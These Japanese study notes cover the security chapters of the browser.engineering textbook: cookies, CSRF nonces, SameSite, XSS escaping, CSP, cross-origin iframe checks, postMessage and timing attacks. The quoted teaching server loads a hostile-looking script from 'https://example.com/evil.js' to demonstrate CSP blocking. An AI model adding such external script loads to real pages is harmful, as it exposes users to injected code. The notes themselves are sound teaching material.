                print("Blocked style", link, "due to CSP")
                continue
            try:
                header, body = style_url.request(url)
            except:
                continue
            self.rules.extend(CSSParser(body).parse())
        self.render()
```

起動:
``` python
if __name__ == "__main__":
    import sys
    Browser().new_tab(URL(sys.argv[1]))
    tkinter.mainloop()
```

#### `src/server10.py`（セキュリティ関連の全体、逐語）

``` python
SESSIONS = {}

def handle_connection(conx):
    req = conx.makefile("b")
    reqline = req.readline().decode('utf8')
    method, url, version = reqline.split(" ", 2)
    assert method in ["GET", "POST"]
    headers = {}
    while True:
        line = req.readline().decode('utf8')
        if line == '\r\n': break
        header, value = line.split(":", 1)
        headers[header.casefold()] = value.strip()
    if 'content-length' in headers:
        length = int(headers['content-length'])
        body = req.read(length).decode('utf8')
    else:
        body = None

    if "cookie" in headers:
        token = headers["cookie"][len("token="):]
    else:
        token = str(random.random())[2:]

    session = SESSIONS.setdefault(token, {})

    status, body = do_request(session, method, url, headers, body)
    response = "HTTP/1.0 {}\r\n".format(status)
    response += "Content-Length: {}\r\n".format(
        len(body.encode("utf8")))
    if "cookie" not in headers:
        template = "Set-Cookie: token={}; SameSite=Lax\r\n"
        response += template.format(token)
    csp = "default-src http://localhost:8000"
    response += "Content-Security-Policy: {}\r\n".format(csp)
    response += "\r\n" + body
    conx.send(response.encode('utf8'))
    conx.close()
```

``` python
def show_comments(session):
    out = "<!doctype html>"
    if "user" in session:
        out += "<h1>Hello, " + session["user"] + "</h1>"
        nonce = str(random.random())[2:]
        session["nonce"] = nonce
        out += "<form action=add method=post>"
        out +=   "<p><input name=guest></p>"
        out +=   "<input name=nonce type=hidden value=" + nonce + ">"
        out +=   "<p><button>Sign the book!</button></p>"
        out += "</form>"
    else:
        out += "<a href=/login>Sign in to write in the guest book</a>"

    for entry, who in ENTRIES:
        out += "<p>" + html.escape(entry) + "\n"
        out += "<i>by " + html.escape(who) + "</i></p>"

    out += "<link rel=stylesheet src=/comment.css>"
    out += "<strong></strong>"
    out += "<script src=/comment.js></script>"
    out += "<script src=https://example.com/evil.js></script>"
    return out
```

``` python
def add_entry(session, params):
    if "user" not in session: return
    if "nonce" not in session or "nonce" not in params: return
    if session["nonce"] != params["nonce"]: return
    if 'guest' in params and len(params['guest']) <= 100:
        ENTRIES.append((params['guest'], session["user"]))
```

``` python
def form_decode(body):
    params = {}
    for field in body.split("&"):
        name, value = field.split("=", 1)
        params[name] = urllib.parse.unquote_plus(value)
    return params
```

リスニング（逐語）:
``` python
if __name__ == "__main__":
    s = socket.socket(
        family=socket.AF_INET,
        type=socket.SOCK_STREAM,
        proto=socket.IPPROTO_TCP,
    )
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', 8000))
    s.listen()
    
    while True:
        conx, addr = s.accept()
        print("Received connection from", addr)
        handle_connection(conx)
```

> 〔本ノート筆者の観察（原典コードに基づく）〕教材サーバに残る簡略化・不整合（教科書で「教材の限界」として言及する価値あり）:
> 1. `token = headers["cookie"][len("token="):]` は Cookie ヘッダが `token=...` 一つだけであることを前提にした**素朴なパース**。複数cookieがあると壊れる。
> 2. `str(random.random())[2:]` はトークンとnonceの両方に使われており、章の脚注どおり**暗号論的に安全でない**（53ビット、予測可能）。
> 3. `show_comments` は `<link rel=stylesheet src=/comment.css>` と出力しているが、`lab10.py` のスタイルシート収集は `"href" in node.attributes` を要求する。したがってこのCSSは実際には読み込まれない（`src` ではなく `href` が正しい属性）。
> 4. nonceはセッションに1つだけ保存されるので、章の脚注が指摘するとおり複数タブでフォームを開くと先のnonceが上書きされる。

#### `src/runtime10.js`（全文、逐語）

``` javascript
console = { log: function(x) { call_python("log", x); } }

document = { querySelectorAll: function(s) {
    var handles = call_python("querySelectorAll", s);
    return handles.map(function(h) { return new Node(h) });
}}

function Node(handle) { this.handle = handle; }

Node.prototype.getAttribute = function(attr) {
    return call_python("getAttribute", this.handle, attr);
}

LISTENERS = {}

function Event(type) {
    this.type = type
    this.do_default = true;
}

Event.prototype.preventDefault = function() {
    this.do_default = false;
}

Node.prototype.addEventListener = function(type, listener) {
    if (!LISTENERS[this.handle]) LISTENERS[this.handle] = {};
    var dict = LISTENERS[this.handle];
    if (!dict[type]) dict[type] = [];
    var list = dict[type];
    list.push(listener);
}

Object.defineProperty(Node.prototype, 'innerHTML', {
    set: function(s) {
        call_python("innerHTML_set", this.handle, s.toString());
    }
});

Node.prototype.dispatchEvent = function(evt) {
    var type = evt.type;
    var handle = this.handle
    var list = (LISTENERS[handle] && LISTENERS[handle][type]) || [];
    for (var i = 0; i < list.length; i++) {
        list[i].call(this, evt);
    }
    return evt.do_default;
}

function XMLHttpRequest() {}

XMLHttpRequest.prototype.open = function(method, url, is_async) {
    if (is_async) throw Error("Asynchronous XHR is not supported");
    this.method = method;
    this.url = url;
}

XMLHttpRequest.prototype.send = function(body) {
    this.responseText = call_python("XMLHttpRequest_send",
        this.method, this.url, body);
}
```

> `innerHTML` のセッターが `call_python("innerHTML_set", ...)` を呼んでいる。第9章で導入されたこの**DOMへのHTML文字列注入経路**が、クライアントサイドXSSのsinkに相当する（本書では文字列がHTMLとしてパースされ、ノードツリーに差し替えられる）。

### 7. 第15章 "Supporting Embedded Content" のセキュリティ関連節（出典: https://browser.engineering/embeds.html = `book/embeds.md`）

第10章と対をなす、iframe／オリジン分離／サイドチャネルの解説。クライアントサイド脆弱性ハンティングの教科書には不可欠。

#### 7.1 `JSContext` をオリジン単位で共有する設計（Iframe Scripts 節）

- **設計原則（逐語）**: 「**\*same-origin\* iframes should run in the same JavaScript context and should be able to access each other's globals, call each other's functions, and modify each other's DOMs**」
- 実装: `JSContext` を `Frame` ごとではなく **`Tab` がオリジン→JSContextの辞書で持つ**。

``` {.python}
class Tab:
    def __init__(self, browser, tab_height):
        # ...
        self.origin_to_js = {}

    def get_js(self, url):
        origin = url.origin()
        if origin not in self.origin_to_js:
            self.origin_to_js[origin] = JSContext(self, origin)
        return self.origin_to_js[origin]
```

``` {.python}
class Frame:
    def load(self, url, payload=None):
        # ...
        self.js = self.tab.get_js(url)
        # ...
```

- 同一 `JSContext` 内で複数ページのスクリプトが動くため、名前空間を `window` グローバル（`Window` 型）で分ける。本書のブラウザでは**すべての変数・関数を `window.` 経由で参照する必要がある**（`window.console`, `window.Node` など）。取りこぼすと次のエラーが出る（逐語）:
``` {.output}
dukpy.JSRuntimeError: ReferenceError: identifier 'Node'
    undefined
    duk_js_var.c:1258
```

#### 7.2 Communicating Between Frames 節

- 同一オリジンフレーム間は `window.parent` 経由で「メソッド呼び出し・変数アクセス・ブラウザ状態の変更」ができる。
- **クロスオリジンの場合（逐語）**: 「it's possible for the lookup in `WINDOWS` to fail, if the parent frame is not in the same origin as the current one and therefore isn't running in the same `JSContext`. ... But **iframes are not allowed to access each others' documents across origins (or call various other APIs that are unsafe)**, so add a method that checks for this situation and raises an exception」

**クロスオリジンアクセスの防壁（逐語）**:
``` {.python}
class JSContext:
    def throw_if_cross_origin(self, frame):
        if frame.url.origin() != self.url_origin:
            raise Exception(
                "Cross-origin access disallowed from script")
```

**ドキュメントに触る全メソッドでチェックする（逐語）**:
``` {.python}
class JSContext:
    def querySelectorAll(self, selector_text, window_id):
        frame = self.tab.window_id_to_frame[window_id]
        self.throw_if_cross_origin(frame)
        # ...

    def setAttribute(self, handle, attr, value, window_id):
        frame = self.tab.window_id_to_frame[window_id]
        self.throw_if_cross_origin(frame)
        # ...

    def innerHTML_set(self, handle, s, window_id):
        frame = self.tab.window_id_to_frame[window_id]
        self.throw_if_cross_origin(frame)
        # ...

    def style_set(self, handle, s, window_id):
        frame = self.tab.window_id_to_frame[window_id]
        self.throw_if_cross_origin(frame)
        # ...
```

- **この防御の不十分さを著者自身が明記（逐語、教科書必載）**:
  > Note that in a real browser **this is woefully inadequate security**. A real browser would need to **very carefully lock down the entire `runtime.js` code and audit every single JavaScript API with a fine-toothed comb**.
- **クロスオリジン間は message passing（逐語）**: 「It would be insecure to let them access each other's variables or call each other's methods, so instead browsers allow a form of [*message passing*][message-passing], a technique for structured communication between two different event loops that doesn't require any shared state or locks.」

`postMessage` の使い方（逐語）:
``` {.javascript .example}
window.parent.postMessage("...", '*')
```
``` {.javascript .example}
window.addEventListener("message", function(e) {
    console.log(e.data);
});
```
- 第2引数はオリジン制限に関わる（演習15-8で `targetOrigin` を実装する）。`https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage`
- **structured cloning の脚注（逐語）**: 「In a real browser, you can also pass data that is not a string, such as numbers and objects. This works via a *serialization* algorithm called [structured cloning][structured-clone], which converts most JavaScript objects (**though not, for example, DOM nodes**) to a sequence of bytes that the receiver frame can convert back into a JavaScript object. DukPy doesn't support structured cloning natively for objects, so our browser won't support this either.」
  - `structured-clone`: `https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm`
- **`postMessage` が非同期である理由（逐語、設計上重要）**: 「Scheduling the task is necessary because `postMessage` is an asynchronous API; **sending a synchronous message might involve synchronizing multiple `JSContext`s or even multiple processes, which would add a lot of overhead and probably result in deadlocks**.」

実装（逐語）:
``` {.javascript}
window.WINDOW_LISTENERS = {}
```
``` {.javascript}
window.MessageEvent = function(data) {
    this.type = "message";
    this.data = data;
}
```
``` {.javascript}
Window.prototype.postMessage = function(message, origin) {
    call_python("postMessage", this._id, message, origin)
}
```
``` {.python}
class JSContext:
    def postMessage(self, target_window_id, message, origin):
        task = Task(self.tab.post_message,
            message, target_window_id)
        self.tab.task_runner.schedule_task(task)
```
``` {.python}
class Tab:
    def post_message(self, message, target_window_id):
        frame = self.window_id_to_frame[target_window_id]
        frame.js.dispatch_post_message(
            message, target_window_id)
```
``` {.python}
POST_MESSAGE_DISPATCH_JS = \
    "window.dispatchEvent(new window.MessageEvent(dukpy.data))"

class JSContext:
    def dispatch_post_message(self, message, window_id):
        self.interp.evaljs(
            self.wrap(POST_MESSAGE_DISPATCH_JS, window_id),
            data=message)
```
``` {.python}
class JSContext:
    # ...
    def parent(self, window_id):
        parent_frame = \
            self.tab.window_id_to_frame[window_id].parent_frame
        if not parent_frame:
            return None
        return parent_frame.window_id
```
``` {.html}
Object.defineProperty(Window.prototype, 'parent', {
  configurable: true,
  get: function() {
    var parent_id = call_python('parent', window._id);
    if (parent_id != undefined) {
        var parent = WINDOWS[parent_id];
        if (parent === undefined) parent = new Window(parent_id);
        return parent;
    }
  }
});
```
- **further ボックス（広告とiframe、逐語）**: 「Ads are commonly served with iframes and are big users of the web's sandboxing, embedding, and animation primitives. ... For example, ad [analytics] are important to the ad economy, but involve running a lot of code and measuring lots of data. Some web APIs, such as [Intersection Observer][io], basically exist to make analytics computations more efficient. And, of course, **ad blockers are probably the most popular [browser extensions][extensions]**.」
  - `io`: `https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API`

#### 7.3 Isolation and Timing 節（逐語ベースで詳細に）

- **脅威モデル（逐語）**:
  > Iframes add a whole new layer of security challenges atop what we discussed in [Chapter 10](security.md). The power to embed one web page into another creates a commensurate security risk when the two pages don't trust each other---**both in the case of embedding an untrusted page into your own page, and the reverse, where an attacker embeds your page into their own, malicious one**. In both cases, we want to protect your page from any security or privacy risks caused by the other frame.
  - 脚注（逐語）: 「Websites can protect themselves from being iframed via the `X-Frame-Options` header.」
- **JSエンジンのバグを前提にした多層防御（逐語）**:
  > The starting point is that cross-origin iframes can't access each other directly through JavaScript. That's good---but what if a bug in the JavaScript engine, like a [buffer overrun][buffer-overrun], lets an iframe circumvent those protections? **Unfortunately, bugs like this are common enough that browsers have to defend against them.** For example, browsers these days **run frames from different origins in [different operating system processes][site-isolation]**, and use operating system features to limit how much access those processes have.
  - `buffer-overrun`: `https://en.wikipedia.org/wiki/Buffer_overflow`
  - `sandbox`: `https://chromium.googlesource.com/chromium/src/+/main/docs/linux/sandboxing.md`
  - `site-isolation`: `https://www.chromium.org/Home/chromium-security/site-isolation/`
- **ラスタライザ経由のクロスフレーム情報漏洩（逐語、教科書必載）**:
  > Other parts of the browser mix content from multiple frames, like our browser's `Tab`-wide display list. That means that **a bug in the rasterizer could allow one frame to take over the rasterizer and then read data that ultimately came from another frame**. This might seem like a rather complex attack, but **it has happened before**, so modern browsers use [sandboxing][sandbox] techniques to prevent it. For example, **Chromium can place the rasterizer in its own process and use a Linux feature called `seccomp` to limit what system calls that process can make**. Even if a bug compromised the rasterizer, that rasterizer wouldn't be able to exfiltrate data over the network, preventing private data from leaking.
- **site isolation の実装難度（逐語）**: 「In practice, the many browser APIs mean the implementation is full of subtleties and ends up being extremely complex. **Chromium, for example, took many years to ship the first implementation of *site isolation*.**」
- **Spectre / Meltdown（逐語、教科書必載）**:
  > Site isolation has become much more important in recent years, due to the **CPU cache timing attacks called [*spectre* and *meltdown*][spectre-meltdown]**. In short, these attacks allow an attacker to **read arbitrary locations in memory---including another frame's data, if the two frames are in the same process---by measuring the time certain CPU operations take**. Placing sensitive content in different CPU processes (which come with their own memory address spaces) is a good protection against these attacks.
  - `spectre-meltdown`: `https://meltdownattack.com/`
- **高精度タイマーの制限（逐語）**:
  > That said, these kinds of *timing attacks* can be subtle, and there are doubtless more that haven't been discovered yet. To try to dull this threat, browsers currently **prevent access to *high-precision timers*** that can provide the accurate timing data typically required for timing attacks. For example, **browsers reduce the accuracy of APIs like `Date.now` or `setTimeout`**.
- **タイマーに見えないタイマー（逐語、教科書必載）**:
  > Worse yet, **there are browser APIs that don't seem like timers but can be used as such**. These APIs are useful, so browsers don't quite want to remove them, but there is also **no way to make them "less accurate", since they are not a clock to begin with**. Browsers now **require [certain optional HTTP headers][sab-headers] to be present in the parent *and* child frames' HTTP responses in order to allow use of `SharedArrayBuffer`** in particular, though this is not a perfect solution.
  - 脚注（逐語）: 「For example, the [SharedArrayBuffer] API lets two JavaScript threads run concurrently and share memory, which can be used to [construct a clock][sab-attack].」
  - `SharedArrayBuffer`: `https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/SharedArrayBuffer`
  - `sab-attack`: `https://security.stackexchange.com/questions/177033/how-can-sharedarraybuffer-be-used-for-timing-attacks`
  - `sab-headers`: `https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/SharedArrayBuffer#security_requirements`
- **著者自身が踏んだ実例（further ボックス、逐語、実務の教訓として価値が高い）**:
  > The `SharedArrayBuffer` issue caused problems when I [added JavaScript support][js-blog] to the embedded browser widgets on [the book's website](https://browser.engineering). I was using `SharedArrayBuffer` to allow synchronous calls from a `JSContext` to the browser, and that required APIs that browsers restrict for security reasons. **Setting the security headers wouldn't work, because Chapter 14 embeds a Youtube video, and as I'm writing this YouTube doesn't send those headers.** In the end, I worked around the issue by not embedding the browser widget and asking the reader to open a new browser window.
  - `js-blog`: `https://browserbook.substack.com/p/javascript-in-javascript`

#### 7.4 第15章の演習からセキュリティ関連（逐語）

- **15-8 *Target origin for `postMessage`*.** Implement the `targetOrigin` parameter to [`postMessage`][postmessage]. This parameter is a string which indicates the frame origins that are allowed to receive the message.
- **15-12 *`X-Frame-Options`*.** Implement [this header][xfo], which disallows a web page from appearing in an iframe.
  - `xfo`: `https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options`
- **15-11 *Iframes added or removed by script*.** The `innerHTML` API can cause iframes to be added or removed, but our browser doesn't load or unload them when this happens.（→ `innerHTML` がiframeを生成しうるという指摘）
- **15-1 *Canvas element*.** `<canvas>`、`getContext("2d")`、`CanvasRenderingContext2D` の描画コマンド実装（同一オリジンポリシーの canvas taint と関わる要素）。

### 8. 本書が意図的に扱わない領域（出典: https://browser.engineering/skipped.html = `book/skipped.md`）

**Connection Security & Privacy 節（逐語）**:
> Web browsers now ship with a sophisticated suite of cryptographic protocols with bewildering names like **AES-GCM, ChaCha20, and HMAC-SHA512**. These protocols protect against malicious actors with the ability to read or write network packets. At the broadest level, connection security is established via the **TLS** protocol (which cameos in [Chapter 1](http.md)) and is maintained by an ecosystem of **cryptographers, certificate authorities, and open-source projects**.
>
> I chose to skip an in-depth discussion of TLS because **this book's irreverent attitude toward completeness and validation is incompatible with real security engineering. A minimal and incomplete version of TLS is a broken and insecure version of it**, contrary to the intended goal and pedagogically counterproductive. The best way to learn about modern cryptography and network security is a book on that topic.
>
> [Privacy on the web][privacy] is another important topic that I skipped. In some ways security and privacy are related (and certainly complement one other), but they are not the same. And privacy on the web is in flux, such as debates around **[third-party cookies][tpc]**, **[fingerprinting]**, and whether there should be APIs to help with advertising. I chose to skip this topic because **many basic concepts remain unsettled: what the standards of privacy are and what role governments, browser developers, website authors, and users should play in them**.

| 参照名 | URL（逐語） |
| --- | --- |
| `privacy` | `https://developer.mozilla.org/en-US/docs/Web/Privacy` |
| `tpc` | `https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#third-party_cookies` |
| `fingerprinting` | `https://developer.mozilla.org/en-US/docs/Glossary/Fingerprinting` |

**JavaScript Execution 節（逐語の要点）**: 現代のブラウザはJavaScriptを実行するだけでなく、**実行時型解析を使って低レベル機械語にJITコンパイル**する。**hidden classes** のような技法でJavaScriptが与えない構造を推論し、メモリ使用量とGC圧を下げる。さらに **WebAssembly**（多くの言語がターゲットにできるハードウェア非依存バイトコード形式。いつかJavaScriptと対等になるかもしれない）も実行する。本書はJSエンジン構築を省略し **DukPy** を使う。

### 9. 用語集の該当エントリ（出典: https://browser.engineering/glossary.html = `book/glossary.md`、逐語）

- **Web security**:
  > The ability to intentionally limit the behavior of web browsers, servers, or applications, usually to prevent harm, unintentional or not. There are lots of different aspects of security: **browser security** (so the user's computer isn't harmed by their browser), **web application security** (so a web application can't be harmed by its users), **privacy** (so a third party can't harm a web user), and many others.
- **Cookie**（Networking節）:
  > A piece of persistent, per-site state stored by web browsers to enable use cases like user login for access-controlled content.
- **Resource**:
  > Anything with its own URL on the web. Web pages are resources, but so are many of their component parts, such as scripts, images, and style sheets. **Resources that are not the HTML page itself are called *subresources*.**
- **Website**: A collection of web pages that together provide some user service.
- **HTTPS**: A variant of HTTP that uses cryptography to provide network security.
- **Browser chrome**: The UI of a browser, such as a tab or URL bar, not including the web page the browser is displaying.
- **Accessibility**: The ability of any person to access and use a web page, regardless of ability, or technology to achieve the same.
- 用語集の前書き（逐語）: 「Web browsers can be quite confusing to understand, especially once you consider the breadth of all their features. As with all software engineering---indeed, all complex subjects---**the best way to avoid confusion is to use *clear and consistent names*.**」

### 10. 第10章に登場するセキュリティ機構の一覧表（原文の記述から構成）

| 機構 | ヘッダ/API（逐語） | 何を防ぐか | 本書の実装範囲 | 残る穴・注意点（原文由来） |
| --- | --- | --- | --- | --- |
| Cookie | `Set-Cookie: foo=bar` / `Cookie: foo=bar` | （防御機構ではなく識別機構） | hostキーのcookie jar、単一cookieのみ | 複数 `Set-Cookie` 非対応。cookie jarはタブ横断のグローバル。サブリソース要求にもcookieが付く |
| Same-origin policy | `URL.origin()` = scheme + host + port | 他オリジンの**レスポンス読み取り** | `XMLHttpRequest` のみ | CSS/JSのリンク読み込みには適用されない。iframe/画像/`localStorage` 等にも適用される。**cookieの「サイト」定義とは別**（cookieはscheme/portを見ない） |
| CSRF nonce | `<input name=nonce type=hidden value=...>` | クロスサイトフォーム送信 | セッションに1つだけ | フォームを1つ忘れれば破れる。nonceはユーザに紐づけないと無意味。**XSSで盗める**。複数タブで上書きされる |
| SameSite cookie | `Set-Cookie: token=...; SameSite=Lax` | クロスサイト`POST`でのcookie送出 | `Lax` と `None` のみ（デフォルト `None`） | `Strict` 未実装。判定はhost一致のみ（schemeful same-site、サブドメイン扱いはブラウザ差）。仕様上は referrer ではなく top-level site を使うべき |
| HTMLエスケープ | Python `html.escape()` / `&lt;` | 反射・保存型XSS | サーバ側の2箇所 | 1箇所でも忘れればセキュリティバグ |
| Content-Security-Policy | `Content-Security-Policy: default-src http://example.org` | 許可オリジン外のリソース読み込み | `default-src` のみ、スペース区切りのオリジン列挙 | 実ブラウザはscheme-generic URL、`self`、`script-src`等のディレクティブも持つ。CSPのパースは**JS/CSS要求より前**に行う必要がある。ブロック時はJS/CSSは無視、XHRは例外 |
| （演習）`HttpOnly` | `Set-Cookie: ...; HttpOnly` | JSからのcookie読み書き | 演習10-3 | RFC 6265 §5.3 |
| （演習）CORS | `Origin` / `Access-Control-Allow-Origin` | （逆に）クロスオリジン読み取りの**明示的許可** | 演習10-5 | 値は要求元オリジンか `*`。本書のリクエストはすべて "simple requests" |
| （演習）`Referrer-Policy` | `Referer` / `Referrer-Policy: no-referrer` / `same-origin` | Referer経由の個人データ漏洩 | 演習10-6 | `Referer` は綴りミスがそのまま仕様 |
| （further）`X-Frame-Options` / CSP `frame-ancestors` | `X-Frame-Options` | クリックジャッキング、意図しないiframe埋め込み | 演習15-12 | `frame-ancestors` が新しい方法 |
| （further）CORB | `Content-Type` を正しく設定 | HTMLをCSSとして、JSONをscriptとして読み込む攻撃 | 未実装 | Chromium の Cross-Origin Read Blocking |
| （further）canvas taint | `drawImage` / `getImageData` | クロスオリジン画像のピクセル読み出し | 未実装 | クロスオリジンデータを書くとcanvasがtaintされ読み出しメソッドがブロックされる |
| （further）forbidden headers | `setRequestHeader` / `getResponseHeader` | スクリプトによるcookie機構・他のセキュリティ機構への干渉 | 未実装 | MDN の Forbidden header name / Forbidden response header name |
| （第15章）`throw_if_cross_origin` | — | クロスオリジンフレームのDOMアクセス | `querySelectorAll` / `setAttribute` / `innerHTML_set` / `style_set` | 著者自ら「woefully inadequate」と明言。実ブラウザは全JS APIの監査が必要 |
| （第15章）`postMessage` | `window.parent.postMessage("...", '*')` / `addEventListener("message", ...)` | （クロスオリジン間の安全な通信手段） | 文字列のみ、`targetOrigin`は演習15-8 | 非同期必須（同期はデッドロックの恐れ）。structured cloningはDOMノードを送れない |
| （第15章）site isolation | — | JSエンジンのバッファオーバーラン、rasterizer経由の情報漏洩、Spectre/Meltdown | 未実装（解説のみ） | Chromiumはrasterizerを別プロセス化し `seccomp` でsyscallを制限 |
| （第15章）高精度タイマー制限 | `Date.now` / `setTimeout` の精度低下、`SharedArrayBuffer` のヘッダ要件 | タイミング攻撃 | 未実装（解説のみ） | 「タイマーに見えないAPI」が問題。親フレームと子フレームの**両方**のレスポンスにヘッダが必要 |

### 11. 章と実装ファイルの対応（出典: `config.json`、逐語ベースの表）

| 章原稿 | lab | server | runtime | stylesheet | tests |
| --- | --- | --- | --- | --- | --- |
| `http.md` | `lab1.py` | — | — | — | `lab1-tests.md` |
| `graphics.md` | `lab2.py` | — | — | — | `lab2-tests.md` |
| `text.md` | `lab3.py` | — | — | — | `lab3-tests.md` |
| `html.md` | `lab4.py` | — | — | — | `lab4-tests.md` |
| `layout.md` | `lab5.py` | — | — | — | `lab5-tests.md` |
| `styles.md` | `lab6.py` | — | — | `browser6.css` | `lab6-tests.md` |
| `chrome.md` | `lab7.py`（+`lab6.py`） | — | — | — | `lab7-tests.md` |
| `forms.md` | `lab8.py` | `server8.py` | — | `browser8.css` | `lab8-tests.md` |
| `scripts.md` | `lab9.py` | `server9.py` | `runtime9.js` | — | `lab9-tests.md`（+`comment9.js`, `comment9.css`） |
| **`security.md`** | **`lab10.py`** | **`server10.py`** | **`runtime10.js`** | — | `lab10-tests.md` |
| `visual-effects.md` | `lab11.py`（+`examples11.py`） | — | — | — | `lab11-tests.md` |
| `scheduling.md` | `lab12.py` | `server12.py` | `runtime12.js`（+`eventloop12.js`） | — | `lab12-tests.md` |
| `animations.md` | `lab13.py` | — | `runtime13.js` | — | `lab13-tests.md`（+`example13-opacity-raf.html`） |
| `accessibility.md` | `lab14.py` | — | `runtime14.js` | `browser14.css` | `lab14-tests.md` |
| `embeds.md` | `lab15.py` | — | `runtime15.js` | `browser15.css` | `lab15-tests.md` |
| `invalidation.md` | `lab16.py`（+`lab15.py`） | — | — | — | `lab16-tests.md` |

### 12. 参考文献（出典: `book/bibliography.md`、front matterタイトルは "More Resources"、逐語）

| 著者 | 書名・記事名 | URL / 出版 |
| --- | --- | --- |
| Tomas Akenine-Möller 他 | *Real-Time Rendering* | `https://www.realtimerendering.com/` / CRC Press, 2018 |
| Tim Berners-Lee with Mark Fischetti | *Weaving the Web* | `https://www.w3.org/People/Berners-Lee/Weaving/Overview.html` / Harper Business, 1999 |
| Matt Brubeck | *Let's Build a Browser Engine* | `https://limpet.net/mbrubeck/2014/08/08/toy-layout-engine-1.html`, 2014 |
| Lin Clark | *Inside a Super Fast CSS engine: Quantum CSS* | `https://hacks.mozilla.org/2017/08/inside-a-super-fast-css-engine-quantum-css-aka-stylo/`, 2017 |
| James D. Foley 他 | *Computer Graphics: Principles and Practice* | Addison-Wesley, 1995 |
| Jesse James Garrett | *Ajax: A New Approach to Web Applications* | 2005 |
| Tali Garsiel | *How Browsers Work* | `https://taligarsiel.com/Projects/howbrowserswork1.htm`, 2009 |
| Tali Garsiel and Paul Irish | *How Browsers Work: Behind the Scenes of Modern Web Browsers* | `https://web.dev/articles/howbrowserswork`, 2011 |
| Ilya Grigorik | *High-performance Browser Networking* | `https://hpbn.co/` / O'Reilly Media, 2013 |
| Alan Grosskurth and Michael W. Godfrey | *A Reference Architecture for Web Browsers* | `https://grosskurth.ca/papers/browser-refarch.pdf`, 2005 |
| Aaron Gustafson | *From URL to Interactive* | `https://alistapart.com/article/from-url-to-interactive/`, 2018 |
| Chris Harrelson | *RenderingNG: Ready for the next generation of web content* | `https://developer.chrome.com/docs/chromium/renderingng`, 2021 |
| Jay Hoffmann | *Web History* | `https://css-tricks.com/chapter-1-birth/`, 2020 |
| Mariko Kosaka | *Inside Look at Modern Web Browsers* | `https://developer.chrome.com/blog/inside-browser-part1`, 2018 |
| Sebastian Peyrott | *A Brief History of JavaScript* | `https://auth0.com/blog/a-brief-history-of-javascript/`, 2017 |
| Simon Pieters | *Idiosyncracies of the HTML parser* | `https://htmlparser.info/`, 2022 |
| Pei-Yuan Wei | *Viola* | `https://archive.is/EOPyw`, 1992 |

---

## 読者が自分で開くべき資料

### なぜこのノートで原典ページを直接取得できなかったか

本作業環境のエージェントプロキシは `browser.engineering:443` への CONNECT を**組織ポリシーにより403で拒否**した（`connect_rejected`: "gateway answered 403 to CONNECT"）。WebFetch も `EGRESS_BLOCKED` を返した。`web.archive.org`、`r.jina.ai`、`webcache.googleusercontent.com` も同様にブロックされていた。一方 `raw.githubusercontent.com` と `github.com` への git clone は通ったため、**同書の公式ソースリポジトリ `https://github.com/browserengineering/book`（commit `c8c6d34b636a0fec3589a4a2e901916c774f1929`）を clone し、公開サイトを生成している原稿Markdownとソースコードを直接読んだ**。したがって本文の内容は逐語で確保されているが、以下は**読者が実際のサイトで自分の目で見るべき**もの（図・GIF・インタラクティブ要素・自動生成部分はMarkdownソースには含まれない）。

### 読みどころ（読者が自分で開くべき順）

1. **https://browser.engineering/security.html（第10章 Keeping Data Private）** — クライアントサイド脆弱性の基礎をブラウザ実装側から理解するための本ノートの中心資料。特に `Same-origin Policy` → `Cross-site Request Forgery` → `SameSite Cookies` → `Cross-site Scripting` → `Content Security Policy` の**この順序**そのものが教材価値を持つ（機能追加が防御を要求する因果の連鎖）。章末の6つの演習（`document.cookie`/`HttpOnly`、CORS、`Referrer-Policy`）は診断者の手を動かす題材として優秀。
2. **図（Figure）とアニメーションGIF** — 原稿には `im/security-cookies-2.gif`（`Set-Cookie`→`Cookie` のやりとり）、`im/security-spa-2.gif`（`XMLHttpRequest` を使うSPAアーキテクチャ）、`im/browser-tab-frame-jscontext-2.gif`（1タブ内の複数フレームが1つの `JSContext` を共有する図）が参照されている。**これらのアニメーション図はMarkdownソースからは読み取れない**のでサイトで見る価値が高い。
3. **https://browser.engineering/widgets/lab10-browser.html（第10章のブラウザをブラウザ内で動かすウィジェット）** — CSPでブロックされたスクリプトがコンソールに `Blocked script ... due to CSP` と出る様子、`SameSite=Lax` でクロスサイトPOSTのcookieが落ちる様子を、自分で触って確認できる。サーバ側（`server10.js`）もブラウザ内で動く。
4. **各章末の「Outline」節** — `python3 infra/outlines.py` で自動生成されるため、**原稿Markdownには結果が入っていない**。その章時点のブラウザ／サーバの全クラス・関数・メソッドの一覧が読める。攻撃面（attack surface）を関数単位で俯瞰するのに有用。
5. **https://browser.engineering/embeds.html の `Isolation and Timing` 節** — site isolation、rasterizerの `seccomp` サンドボックス、Spectre/Meltdown、`SharedArrayBuffer` とヘッダ要件。第10章の「Web層の防御」の下にある「プロセス層・CPU層の防御」を理解するための短いが密度の高い節。
6. **https://browser.engineering/onepage.html（ワンページ版）** — 全16章を1ページで通読・全文検索できる。特定のヘッダ名やAPI名がどの章で出てくるかを横断検索したいときに便利。
7. **インタラクティブなクイズ（quiz）** — サイトには `mdbook-quiz` ベースの多肢選択クイズが埋め込まれている（`www/quiz-embed.iife.js`）。理解確認に使えるが、原稿Markdownからは問題文が読めない。
8. **https://browser.engineering/skipped.html（What Wasn't Covered）** — 本書が**意図的に扱わなかった**領域（TLSの詳細、プライバシー、third-party cookie、フィンガープリンティング、JITとWebAssembly）の一覧。教科書の「この先どこを別資料で学ぶべきか」の地図として使える。

### 日本語で読みたい場合

- 日本語版（オライリー・ジャパン）: `https://www.oreilly.co.jp/books/9784814401574/` — トップページに「Japanese (from O'Reilly)」として明示されている。本ノートの内容は原書の英語原稿に基づくため、日本語での正式な訳語は同書を参照すべき。

---

## 補足注記

- 〔補足（一般知識）〕本ノートの第10章の内容は、原稿執筆時点の `SameSite` 仕様がまだドラフト段階であるという著者の注記を含む。原文自身が「this section may become out of date」と述べているため、`SameSite` のデフォルト値やschemeful same-siteの扱いについては、教科書に転記する際に必ず「本書執筆時点の記述」と明示し、最新の MDN `https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite` を併記するのが安全である。
